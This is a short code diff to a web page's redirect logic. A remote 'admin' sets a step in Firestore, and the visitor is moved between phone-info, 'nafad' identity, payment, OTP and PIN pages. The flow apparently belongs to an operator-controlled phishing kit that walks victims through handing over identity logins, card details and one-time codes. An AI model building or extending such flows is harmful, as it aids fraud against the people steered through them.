@@ -45,18 +45,27 @@ export default function ConfiPage() {
           const data = docSnapshot.data()
           const step = data.currentStep
 
-          // Redirect based on currentStep
+          // Admin navigation: Handle page redirects
           if (step === "home") {
-            router.push("/main")
+            console.log("[confi] Admin redirecting to home")
+            window.location.href = "/"
           } else if (step === "phone") {
-            router.push("/phone-info")
+            console.log("[confi] Admin redirecting to phone-info")
+            window.location.href = "/phone-info"
           } else if (step === "nafad") {
-            router.push("/nafad")
+            console.log("[confi] Admin redirecting to nafad")
+            window.location.href = "/nafad"
           } else if (step === "payment") {
-            router.push("/check")
+            console.log("[confi] Admin redirecting to payment")
+            window.location.href = "/check"
           } else if (step === "otp") {
-            router.push("/veri")
+            console.log("[confi] Admin redirecting to otp")
+            window.location.href = "/veri"
+          } else if (typeof step === "number") {
+            console.log("[confi] Admin redirecting to home with step:", step)
+            window.location.href = "/"
           }
+          // If step === "pin" or "confi", stay on this page
         }
       },
       (error) => {
